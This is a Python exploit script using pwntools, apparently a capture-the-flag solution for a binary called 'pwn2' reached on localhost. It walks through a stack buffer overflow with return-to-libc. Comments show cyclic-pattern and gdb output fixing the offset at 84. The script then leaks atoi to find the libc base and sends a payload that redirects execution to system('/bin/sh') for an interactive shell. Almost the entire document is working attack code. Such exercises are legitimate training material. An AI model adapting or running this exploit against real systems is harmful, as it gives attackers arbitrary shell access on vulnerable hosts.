#!/usr/bin/env python3
from pwn import *

# Stack based buffer overflow - return to libc

elf = ELF("./pwn2")
libc = ELF("./libc.so.6")

if args.LOCAL:
  p = process(elf.path)
else:
  p = remote("localhost", 9002)

# feed `pwn cyclic 200` into the program with gdb, and it will crash on instruction 0x61616176
# pwn cyclic -l 0x61616176
"""
root@e6368c853402:/opt/pwn2# pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
root@e6368c853402:/opt/pwn2# gdb -q pwn2
Reading symbols from pwn2...
(gdb) run
Starting program: /opt/pwn2/pwn2
Enter a number to count the number of digits:
Note: using the atoi function at address: f7dc4620
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
There are 0 digits in aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616176 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 51] will be killed.

Quit anyway? (y or n) y
root@e6368c853402:/opt/pwn2# pwn cyclic -l 0x61616176
84
"""
offset = 84

# read address of atoi in memory of the target
p.recvuntil("address: ")
address_of_atoi = int(p.recvline().decode("utf-8").strip(), 16) # convert from hex characters to a number
log.info(f"Address of atoi is {hex(address_of_atoi)}")

# now that we know address of atoi in memory, we can use it to calculate the base address of libc in memory for the target
# This is because we know the offset to the atoi function within the provided libc
libc.address = address_of_atoi - libc.symbols["atoi"]
log.info(f"Base address of libc is {hex(libc.address)}")

# get address of system and a "/bin/sh" string from libc
system_address = libc.symbols["system"]
binsh_address = next(libc.search(b"/bin/sh\x00"))

# create a fake stack frame, overwriting the saved EIP with the address of system, and putting the "/bin/sh" string into the position of the first argument
payload = b"A" * offset + p32(system_address) + b"B" * 4 + p32(binsh_address)

p.sendline(payload)
p.interactive()
